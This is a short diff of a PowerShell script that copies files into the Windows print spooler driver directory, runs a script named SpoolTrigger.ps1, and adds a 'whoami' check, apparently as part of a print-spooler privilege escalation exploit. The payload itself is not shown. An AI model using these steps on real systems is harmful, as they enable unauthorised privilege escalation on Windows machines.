@@ -46,6 +46,7 @@ cd "$Env:TMP\bin"
 Move-Item -Path "*" -Destination "$Env:WINDIR\System32\spool\drivers\x64\3\" -Force
 cd "$Env:WINDIR\System32\spool\drivers\x64\3"
 .\SpoolTrigger.ps1
+whoami
 
 # CleanUp
 Stop-Service -Name "PrintNotify" -Force
